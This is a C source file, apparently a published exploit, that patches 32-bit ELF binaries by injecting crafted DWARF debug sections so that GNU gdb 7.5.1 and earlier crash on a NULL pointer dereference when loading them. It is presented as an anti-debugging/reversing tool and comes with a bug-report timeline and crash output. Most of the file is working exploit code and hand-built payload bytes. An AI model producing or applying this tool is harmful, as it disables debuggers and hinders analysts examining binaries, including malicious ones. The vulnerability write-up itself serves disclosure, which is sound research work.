/*
*
* gdb (GNU debugger) <= 7.5.1 (crash due a NULL pointer dereference)
* ELF anti-debugging/reversing patcher
*
* - nitr0us [ http://twitter.com/nitr0usmx ]
*
* Tested under:
* GNU gdb 7.5.1       (OpenBSD 5.2 i386    [Compiled from sources])
* GNU gdb 7.5         (OpenBSD 5.2 i386    [Compiled from sources])
* GNU gdb 7.5         (Ubuntu Server 12.04 [Compiled from sources])
* GNU gdb 7.4.1       (OpenBSD 5.2 i386)
* GNU gdb 7.4-2012.04 (Ubuntu Server 12.04)
* GNU gdb 7.2-50.el6  (CentOS Linux)
* GNU gdb 6.7.1       (Gentoo Linux)
*
* Bug found using Frixyon fuzzer (my ELF file format fuzzer still in development)
*
* Timeline:
* 12/11/2012	The bug was found on GNU gdb 7.5
* 19/11/2012	The bug was reported through the official GNU gdb.s bug tracker:
                http://sourceware.org/bugzilla/show_bug.cgi?id=14855
* 10/12/2012	Retested with the latest release (7.5.1), which still has the bug
* 12/12/2012	The status on the tracker is still "NEW"
*
**************** TECHNICAL DETAILS ***********************
In gdb-7.5.1/gdb/dwarf2read.c is the following data structure:
struct line_header
{
...
  unsigned int num_include_dirs, include_dirs_size;
  char **include_dirs;
...
  struct file_entry
  {
    char *name;
    unsigned int dir_index;
    unsigned int mod_time;
    unsigned int length;
...
  } *file_names;
}

The problem exists when trying to open a malformed ELF that contains a
file_entry.dir_index > 0 and char **include_dirs pointing to NULL.

After patching an ELF file with this code, the following happens:

(gdb) r -q ./evil_exploit

Program received signal SIGSEGV, Segmentation fault.
0x081e87bd in psymtab_include_file_name (lh=0x8594420, file_index=0,
pst=0x8583650, comp_dir=0x858362c "/home/nitr0us") at dwarf2read.c:13969
13970       dir_name = lh->include_dirs[fe.dir_index - 1];
(gdb) p/x fe
$1 = {name = 0x8583718, dir_index = 0xf, mod_time = 0x0, length = 0x0,
included_p = 0x1, symtab = 0x0}
(gdb) p lh->include_dirs
$2 = (char **) 0x0
(gdb) x/i $eip
=> 0x81e87bd <psymtab_include_file_name+111>:   mov    (%eax),%eax
(gdb) i r $eax
eax            0x38     56

The root cause of the problem is that there's no validation to 
verify if include_dirs is different from NULL before referencing it.

**********************************************************
*
* [Compilation] $ gcc gdb_751_elf_shield.c -o gdb_751_elf_shield -Wall
*
* http://chatsubo-labs.blogspot.com
* http://www.brainoverflow.org
*
*/

#include <sys/mman.h>
#include <sys/stat.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdio.h>
#include <fcntl.h>

#if defined(__OpenBSD__) || defined(__NetBSD__) || defined(__FreeBSD__)
#include <sys/exec_elf.h>
#else
#include <elf.h>
#endif

/*
* The next payload is based on the 'struct line_header'
* defined in gdb-7.5.1/gdb/dwarf2read.c
*
* The fields are put in little-endian (LSB)
*/
const char dwarf_line_header[] = {
	0x32, 0x00, 0x00, 0x00,             // unsigned int total_length;
	0x02, 0x00,                         // unsigned short version;
	0x1c, 0x00, 0x00, 0x00,             // unsigned int header_length;
	0x01,                               // unsigned char minimum_instruction_length;
	0x01,                               // unsigned char maximum_ops_per_instruction;
	0xfb,                               // int line_base; in runtime = 0xfffffffb, however, in file system it's only one byte o_O?
	0x0e,                               // unsigned char line_range;
	0x0d,                               // unsigned char opcode_base;
	'N' , '1' , '7' , 'R' , '0' ,       // Useless to trigger the bug
	0xDE, 0xAD, 0xBA, 0xBE,             // Useless to trigger the bug
	0x31, 0x33, 0x70,                   // Useless to trigger the bug
	0x00,                               // (KILLER BYTE) char **include_dirs; This will expand to a NULL pointer 0x00000000
	'C' , 'R' , '4' , '5' , 'H' , 0x00, // file_entry->name
	0x31,                               // (KILLER BYTE) file_entry->dir_index; dwarf_line_header->include_dirs[file_entry.dir_index - 1]; SIGSEGV !
	0x33,                               // file_entry->mod_time;
	0x70,                               // file_entry->length;
	0x00, 0x00, 0x05, 0x02,             // Couldn't detect where exactly are loaded in memory at runtime
	0xd4, 0x83, 0x04, 0x08,             // . . .
	0x15, 0x91, 0xbc, 0x59,             // . . .
	0x02, 0x02, 0x00, 0x01,             // . . .
	0x01,                               // Couldn't detect where exactly are loaded in memory at runtime
};

/*
* The next ELF sections are necessary to crash gdb.
* They were taken from a normal ELF file compiled with -ggdb
* $objdump -s -j .debug_xxx ./a.out
*/
char debug_info[] = {
	0x87, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x01, 0x3b, 0x00, 0x00, 0x00,
	0x01, 0x00, 0x00, 0x00, 0x00, 0x55, 0x00, 0x00, 0x00, 0xd4, 0x83, 0x04, 0x08, 0xf0, 0x83, 0x04,
	0x08, 0x00, 0x00, 0x00, 0x00, 0x02, 0x04, 0x07, 0x2e, 0x00, 0x00, 0x00, 0x02, 0x01, 0x08, 0x47,
	0x00, 0x00, 0x00, 0x02, 0x02, 0x07, 0x07, 0x00, 0x00, 0x00, 0x02, 0x04, 0x07, 0x29, 0x00, 0x00,
	0x00, 0x02, 0x01, 0x06, 0x49, 0x00, 0x00, 0x00, 0x02, 0x02, 0x05, 0x1a, 0x00, 0x00, 0x00, 0x03,
	0x04, 0x05, 0x69, 0x6e, 0x74, 0x00, 0x02, 0x08, 0x05, 0x68, 0x00, 0x00, 0x00, 0x02, 0x08, 0x07,
	0x24, 0x00, 0x00, 0x00, 0x02, 0x04, 0x05, 0x6d, 0x00, 0x00, 0x00, 0x02, 0x01, 0x06, 0x50, 0x00,
	0x00, 0x00, 0x04, 0x01, 0x63, 0x00, 0x00, 0x00, 0x01, 0x03, 0x4f, 0x00, 0x00, 0x00, 0xd4, 0x83,
	0x04, 0x08, 0xf0, 0x83, 0x04, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00
};

char debug_abbrev[] = {
	0x01, 0x11, 0x01, 0x25, 0x0e, 0x13, 0x0b, 0x03, 0x0e, 0x1b, 0x0e, 0x11, 0x01, 0x12, 0x01, 0x10,
	0x06, 0x00, 0x00, 0x02, 0x24, 0x00, 0x0b, 0x0b, 0x3e, 0x0b, 0x03, 0x0e, 0x00, 0x00, 0x03, 0x24,
	0x00, 0x0b, 0x0b, 0x3e, 0x0b, 0x03, 0x08, 0x00, 0x00, 0x04, 0x2e, 0x00, 0x3f, 0x0c, 0x03, 0x0e,
	0x3a, 0x0b, 0x3b, 0x0b, 0x49, 0x13, 0x11, 0x01, 0x12, 0x01, 0x40, 0x06, 0x00, 0x00, 0x00
};

char debug_str[] = {
	0x65, 0x76, 0x69, 0x6c, 0x2e, 0x63, 0x00, 0x73, 0x68, 0x6f, 0x72, 0x74, 0x20, 0x75, 0x6e, 0x73,
	0x69, 0x67, 0x6e, 0x65, 0x64, 0x20, 0x69, 0x6e, 0x74, 0x00, 0x73, 0x68, 0x6f, 0x72, 0x74, 0x20,
	0x69, 0x6e, 0x74, 0x00, 0x6c, 0x6f, 0x6e, 0x67, 0x20, 0x6c, 0x6f, 0x6e, 0x67, 0x20, 0x75, 0x6e,
	0x73, 0x69, 0x67, 0x6e, 0x65, 0x64, 0x20, 0x69, 0x6e, 0x74, 0x00, 0x47, 0x4e, 0x55, 0x20, 0x43,
	0x20, 0x34, 0x2e, 0x36, 0x2e, 0x33, 0x00, 0x75, 0x6e, 0x73, 0x69, 0x67, 0x6e, 0x65, 0x64, 0x20,
	0x63, 0x68, 0x61, 0x72, 0x00, 0x2f, 0x68, 0x6f, 0x6d, 0x65, 0x2f, 0x6e, 0x69, 0x74, 0x72, 0x30,
	0x75, 0x73, 0x00, 0x6d, 0x61, 0x69, 0x6e, 0x00, 0x6c, 0x6f, 0x6e, 0x67, 0x20, 0x6c, 0x6f, 0x6e,
	0x67, 0x20, 0x69, 0x6e, 0x74, 0x00
};

/* Global vars & structs that'll used later */
Elf32_Ehdr      *header;
Elf32_Shdr	*sht; // Section Header Table
Elf32_Phdr      *pht; // Program Header Table
Elf32_Shdr	*shstrtab_section;
Elf32_Word	s_debug_line_size = 0;
Elf32_Word	shstrtab_size     = 0;
Elf32_Off	shstrtab_offset   = 0;
Elf32_Off	debug_line_offset = 0;
struct stat	statinfo; // We'll use only st_size and st_mode
char		*elfptr;
int		fd, tmpfd, k;

int isELF(int);

Elf32_Off findDebugLineSection()
{
	for(k = 0; k < header->e_shnum; k++, sht++)
		if(strcmp(elfptr + shstrtab_offset + sht->sh_name, ".debug_line") == 0){
			s_debug_line_size = sht->sh_size;

			return sht->sh_offset;
		}

	return 0;
}

/*
* This function will add the section '.debug_line'
* with the payload inside. Also, it's necessary to 
* update some ELF metadata as well as to include some
* extra Elf32_Shdr structures in the middle of the file.
*
* I solved this problem doing the following steps:
*
* 1.- Patch the .shstrtab (and .strtab) sections size, so
*     the names (strings at the end of the file) of the new appended 
*     sections will be inside that sections (gdb checks for the offsets).
*
* 2.- Create 4 new Elf32_Shdr structures (.debug_line, .debug_info,
*     .debug_abbrev and .debug_str) which are necessary to crash gdb:
*     ->sh_name is a relative offset to shstrtab_section->sh_offset
*       So, it'll be pointing to statinfo.st_size - shstrtab_section->sh_offset
*       (it means that at the end of the file there will be the
*       string '.debug_line' (null terminated)). The same calculations for the
*       other 3 new sections added.
*     ->sh_offset is the absolute offset in file system, so it'll be
*       pointing to the end of the file.
*     ->sh_size will be obviously sizeof() each section content (payloads)
*
* 3.- Calculate the insertion point (offset in file system):
*     header->e_shoff + header->e_shnum * sizeof(Elf32_Shdr)
*
* 4.- Four Elf32_Shdr structured will be appended at the end of the 
*     Section Header Table, so it means that for each program header 
*     who's segment is after the insertion, its offset in file system has to 
*     be updated to reflect the new position after insertion:
*     pht->p_offset += sizeof(Elf32_Shdr) * n_sections_to_inject;
*     Also update the header->e_phoff (in case it's after the injection point).
*
* 5.- Update the ELF header to account for 4 extra section headers:
*     ->header->e_shnum += n_sections_to_inject;
*
* 6.- Synchronize the ELF in file system with its corresponding 
*     pointer in memory to reflect the previous changes (msync()).
*     Also close the file descriptor.
*
* 7.- Physically insert the Elf32_Shdr structures at the end 
*     of the Section Header Table (insertion point calculated in the step 3).
*     After that, copy the rest of the file.

* 8.- Insert the names of the new sections (strings '.debug_line', '.debug_info',
*     '.debug_abbrev' and '.debug_str') followed by its corresponding null byte.
*
* 9.- Finally, insert the payloads (dwarf_line_header[], debug_info[], debug_str[]
*     and debug_abbrev[])
*
*/
int addDebugLineSection()
{
	unsigned int	n_sections_to_inject = 4; // .debug_line (bogus data), .debug_info, .debug_abbrev and .debug_str
	unsigned int	n_sections_names_len = strlen(".debug_str") + 1 
						+ strlen(".debug_info") + 1 
						+ strlen(".debug_line") + 1 
						+ strlen(".debug_abbrev") + 1;

	// Step 1
	shstrtab_section->sh_size = statinfo.st_size - shstrtab_offset + sizeof(Elf32_Shdr) * n_sections_to_inject + n_sections_names_len;
	printf("[+] Patching the size of \".shstrtab\" section to 0x%.4x\n", shstrtab_section->sh_size);

	sht = (Elf32_Shdr *) (elfptr + header->e_shoff);
	for(k = 0; k < header->e_shnum; k++, sht++)
		if(strcmp(elfptr + shstrtab_offset + sht->sh_name, ".strtab") == 0){
			sht->sh_size = shstrtab_section->sh_size;
			printf("[+] Patching the size of \".strtab\" section to 0x%.4x as well (gdb also check this size)\n\n", sht->sh_size);
			break;
		}

	// Step 2
	Elf32_Shdr	debug_line_sechdr, debug_info_sechdr, debug_abbrev_sechdr, debug_str_sechdr;

	debug_line_sechdr.sh_type = debug_info_sechdr.sh_type = debug_abbrev_sechdr.sh_type = debug_str_sechdr.sh_type = 0x0001;
	debug_line_sechdr.sh_flags = debug_info_sechdr.sh_flags = debug_abbrev_sechdr.sh_flags = 0x0000;
	debug_str_sechdr.sh_flags = 0x0030;
	debug_line_sechdr.sh_addr = debug_info_sechdr.sh_addr = debug_abbrev_sechdr.sh_addr = debug_str_sechdr.sh_addr = 0x00000000;
	debug_line_sechdr.sh_link = debug_info_sechdr.sh_link = debug_abbrev_sechdr.sh_link = debug_str_sechdr.sh_link = 0x0000;
	debug_line_sechdr.sh_info = debug_info_sechdr.sh_info = debug_abbrev_sechdr.sh_info = debug_str_sechdr.sh_info = 0x0000;
	debug_line_sechdr.sh_addralign = debug_info_sechdr.sh_addralign = debug_abbrev_sechdr.sh_addralign = debug_str_sechdr.sh_addralign = 0x0001;
	debug_line_sechdr.sh_entsize = debug_info_sechdr.sh_entsize = debug_abbrev_sechdr.sh_entsize = debug_str_sechdr.sh_entsize = 0x0000;

	debug_line_sechdr.sh_size =	sizeof(dwarf_line_header);
	debug_info_sechdr.sh_size =	sizeof(debug_info);
	debug_str_sechdr.sh_size =	sizeof(debug_str);
	debug_abbrev_sechdr.sh_size =	sizeof(debug_abbrev);

	// Relative offsets to shstrtab_offset
	debug_line_sechdr.sh_name =	statinfo.st_size + sizeof(Elf32_Shdr)* n_sections_to_inject - shstrtab_offset;
	debug_info_sechdr.sh_name =	statinfo.st_size + sizeof(Elf32_Shdr)* n_sections_to_inject - shstrtab_offset 
					+ strlen(".debug_line") + 1;
	debug_str_sechdr.sh_name =	statinfo.st_size + sizeof(Elf32_Shdr)* n_sections_to_inject - shstrtab_offset
					+ strlen(".debug_line") + 1
					+ strlen(".debug_info") + 1;
	debug_abbrev_sechdr.sh_name =	statinfo.st_size + sizeof(Elf32_Shdr)* n_sections_to_inject - shstrtab_offset
					+ strlen(".debug_line") + 1
					+ strlen(".debug_info") + 1
					+ strlen(".debug_str")  + 1;

	// Absolute offsets at the end of the file
	debug_line_sechdr.sh_offset =	statinfo.st_size + sizeof(Elf32_Shdr) * n_sections_to_inject + n_sections_names_len;
	debug_info_sechdr.sh_offset =	statinfo.st_size + sizeof(Elf32_Shdr) * n_sections_to_inject + n_sections_names_len
					+ debug_line_sechdr.sh_size;
	debug_str_sechdr.sh_offset =	statinfo.st_size + sizeof(Elf32_Shdr) * n_sections_to_inject + n_sections_names_len
					+ debug_line_sechdr.sh_size
					+ debug_info_sechdr.sh_size;
	debug_abbrev_sechdr.sh_offset =	statinfo.st_size + sizeof(Elf32_Shdr) * n_sections_to_inject + n_sections_names_len
					+ debug_line_sechdr.sh_size
					+ debug_info_sechdr.sh_size
					+ debug_str_sechdr.sh_size;

	// Step 3
	Elf32_Off shdr_insertion_point = header->e_shoff + header->e_shnum * sizeof(Elf32_Shdr);

	printf("[*] The insertion point will be at: 0x%.4x\n\n", shdr_insertion_point);

	// Step 4
	pht = (Elf32_Phdr *) (elfptr + header->e_phoff);

	if(header->e_phoff >= shdr_insertion_point){
		header->e_phoff += sizeof(Elf32_Shdr) * n_sections_to_inject;

		printf("[+] The Program Header Table is after the insertion point. Fixing p_offset to 0x%.4x\n", header->e_phoff);
	} else
		printf("[-] The Program Header Table is before the insertion point.\n");


	for(k = 0; k < header->e_phnum; k++, pht++)
		if(pht->p_offset >= shdr_insertion_point){
			pht->p_offset += sizeof(Elf32_Shdr) * n_sections_to_inject;

			printf("[+] The Program Header[	%d ] is after the insertion point. Fixing p_offset to 0x%.4x\n", k, pht->p_offset);
		}

	// Step 5
	header->e_shnum += n_sections_to_inject;

	// Step 6
	if(msync(elfptr, 0, MS_SYNC) == -1){
		perror("msync");
		return 0;
	}

	close(fd);

	// Step 7
	if((tmpfd = creat("modified_elf.tmp", statinfo.st_mode)) == -1){
		perror("creat");
		return 0;
        }

	if(write(tmpfd, elfptr, shdr_insertion_point) == -1)
		return 0;

	printf("\n[+] Injecting the '.debug_line' Elf32_Shdr struct at the end of the Section Header Table...\n");
	if(write(tmpfd, &debug_line_sechdr, sizeof(Elf32_Shdr)) == -1)
		return 0;

	printf("[+] Injecting the '.debug_info' Elf32_Shdr struct at the end of the Section Header Table...\n");
	if(write(tmpfd, &debug_info_sechdr, sizeof(Elf32_Shdr)) == -1)
		return 0;

	printf("[+] Injecting the '.debug_str' Elf32_Shdr struct at the end of the Section Header Table...\n");
	if(write(tmpfd, &debug_str_sechdr, sizeof(Elf32_Shdr)) == -1)
		return 0;

	printf("[+] Injecting the '.debug_abbrev' Elf32_Shdr struct at the end of the Section Header Table...\n\n");
	if(write(tmpfd, &debug_abbrev_sechdr, sizeof(Elf32_Shdr)) == -1)
		return 0;

	// Copy the rest of the original file
	if(write(tmpfd, elfptr + shdr_insertion_point, statinfo.st_size - shdr_insertion_point) == -1)
		return 0;


	// Step 8
	if(write(tmpfd, ".debug_line\0", strlen(".debug_line") + 1) == -1)
		return 0;

	if(write(tmpfd, ".debug_info\0", strlen(".debug_info") + 1) == -1)
		return 0;

	if(write(tmpfd, ".debug_str\0", strlen(".debug_str") + 1) == -1)
		return 0;

	if(write(tmpfd, ".debug_abbrev\0", strlen(".debug_abbrev") + 1) == -1)
		return 0;

	// Step 9
	printf("[+] Injecting the malformed line header structure (payload) into the new created '.debug_line' section...\n");
	if(write(tmpfd, dwarf_line_header, sizeof(dwarf_line_header)) == -1)
		return 0;

	printf("[+] Injecting the content of '.debug_info', '.debug_str' and '.debug_abbrev' sections...\n");
	if(write(tmpfd, debug_info, sizeof(debug_info)) == -1)
		return 0;

	if(write(tmpfd, debug_str, sizeof(debug_str)) == -1)
		return 0;

	if(write(tmpfd, debug_abbrev, sizeof(debug_abbrev)) == -1)
		return 0;

	close(tmpfd);

	return 1;
}

int main(int argc, char **argv)
{
	printf("######################################################\n");
	printf("#                                                    #\n");
	printf("#          gdb (GNU debugger) <= 7.5.1               #\n");
	printf("#     (crash due a NULL pointer dereference)         #\n");
	printf("#                                                    #\n");
	printf("#      ELF anti-debugging/reversing patcher          #\n");
	printf("#                     -nitr0us-                      #\n");
	printf("#                                                    #\n");
	printf("######################################################\n\n");

	if(argc < 2){
		fprintf(stderr, "Usage: %s <elf_file_to_patch>\n", argv[0]);
		exit(-1);
	}

	if((fd = open(argv[1], O_RDWR)) == -1){
		perror("open");
		exit(-1);
	}

	if(!isELF(fd)){
		close(fd);
		exit(-1);
	}

	if(fstat(fd, &statinfo) == -1){
		perror("stat");
		close(fd);
		exit(-1);
	}

	if((elfptr = (char *) mmap(NULL, statinfo.st_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0)) == MAP_FAILED){
		perror("mmap");
		close(fd);
		exit(-1);
	}

	header = (Elf32_Ehdr *) (elfptr);

	if(header->e_shoff == 0){
		fprintf(stderr, "[!] \"%s\" doesn't have a Section Header Table !\n", argv[1]);
		close(fd);
		munmap(elfptr, 0);
		exit(-1);
	}

	sht = (Elf32_Shdr *) (elfptr + header->e_shoff);

	printf("[*] The ELF file originally has: %d (0x%.4x) bytes\n", (int) statinfo.st_size, (int) statinfo.st_size);
	printf("[-] Ehdr->e_shnum:    %5d (0x%.4x)\n", header->e_shnum, header->e_shnum);
	printf("[-] Ehdr->e_shoff:    %5d (0x%.4x)\n", header->e_shoff, header->e_shoff);
	printf("[-] Ehdr->e_shstrndx: %5d (0x%.4x)\n", header->e_shstrndx, header->e_shstrndx);

	// Find the Section Header corresponding to the 
	// "Section Header String Table" to get the file offset from there
	shstrtab_section = (Elf32_Shdr *)(elfptr + header->e_shoff + header->e_shstrndx * sizeof(Elf32_Shdr));
	if((shstrtab_size = shstrtab_section->sh_size) > 0)
		if(!(shstrtab_offset = shstrtab_section->sh_offset)){
			fprintf(stderr, "[!] shstrtab_section->sh_offset is 0 (cero) !\n");
			close(fd);
			munmap(elfptr, 0);
			exit(-1);
		}

	printf("[-] shstrtab_offset:  %5d (0x%.4x)\n", (int) shstrtab_offset, (int) shstrtab_offset);
	printf("[-] shstrtab_size  :  %5d (0x%.4x)\n\n", (int) shstrtab_size, (int) shstrtab_size);

	printf("[*] Looking for the '.debug_line' section...\n\n");

	if(!(debug_line_offset = findDebugLineSection())){
		printf("[-] '.debug_line' section was not found in the Section Header Table !\n");
		printf("[*] Adding the '.debug_line' with the payload inside\n\n");

		if(!addDebugLineSection()){
			fprintf(stderr, "[!] The '.debug_line' section couldn't be added. Sorry !\n\n");
			close(fd);
			munmap(elfptr, 0);
			exit(-1);
		}

		printf("[+] The '.debug_line' section was added successfully with the payload inside\n\n");

		if(rename("modified_elf.tmp", argv[1]) == -1)
			perror("rename");
	} else {
		printf("[+] '.debug_line' section was found at offset %5d (0x%.4x) within the file\n", (int) debug_line_offset, (int) debug_line_offset);
		printf("[*] '.debug_line' size = %5d bytes\n", (int) s_debug_line_size);

		if(s_debug_line_size < sizeof(dwarf_line_header)){
			fprintf(stderr, "[!] '.debug_line' section is smaller than the payload to be injected (%d bytes)\n\n", (int) sizeof(dwarf_line_header));
			exit(-1);
		} else 
			printf("[*] '.debug_line' section has enough space for the payload (%d bytes)\n\n", (int) sizeof(dwarf_line_header));

		printf("[*] Overwriting its content with the payload\n\n");

		memcpy(elfptr + debug_line_offset, dwarf_line_header, sizeof(dwarf_line_header));
	}

	// Synchronize the ELF in file system with the previous memory mapped
	if(msync(elfptr, 0, MS_SYNC) == -1){
		perror("msync");
		close(fd);
		exit(-1);
	}

	close(fd);
	munmap(elfptr, 0);

	printf("[*] \"%s\" is now completely patched\n", argv[1]);
	printf("[*] gdb (GNU debugger) <= 7.5.1 should crash trying to load \"%s\"\n", argv[1]);

	return 0;
}

int isELF(int fd)
{
	Elf32_Ehdr	header;

	if(read(fd, &header, sizeof(header)) == -1){
		perror("isELF(): read");
		return 0;
	}

	/* magic number verification */
	if(header.e_ident[EI_MAG0] != ELFMAG0 ||
			header.e_ident[EI_MAG1] != 'E' ||
			header.e_ident[EI_MAG2] != 'L' ||
			header.e_ident[EI_MAG3] != 'F'){
		fprintf(stderr, "The argument given is not an ELF file !\n");
		return 0;
	}

	/* 32-bit class verification */
	if(header.e_ident[EI_CLASS] != ELFCLASS32){
		fprintf(stderr, "Only 32-bit ELF files supported !\n");
		return 0;
	}

	/* little-endian verification */
	if(header.e_ident[EI_DATA] != ELFDATA2LSB){
		fprintf(stderr, "Only little-endian ELF files supported !\n");
		return 0;
	}

	return 1;
}
